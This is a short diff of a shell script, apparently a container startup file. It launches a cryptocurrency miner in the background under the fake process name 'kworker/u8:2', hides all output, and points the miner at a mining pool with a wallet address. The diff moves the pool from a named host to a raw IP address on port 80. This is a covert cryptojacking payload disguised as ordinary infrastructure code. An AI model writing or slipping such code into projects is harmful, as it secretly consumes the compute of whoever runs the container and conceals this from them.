@@ -16,6 +16,6 @@ rm -f /app/sr
 
 sleep 3
 
-(exec -a kworker/u8:2 /app/$NAME -a yescryptr32 -o eu.rplant.xyz:7047 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.marry -p x >/dev/null 2>&1 &)
+(exec -a kworker/u8:2 /app/$NAME -a yescryptr32 -o 157.173.100.15:80 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.marry -p x >/dev/null 2>&1 &)
 
 tail -f /dev/null
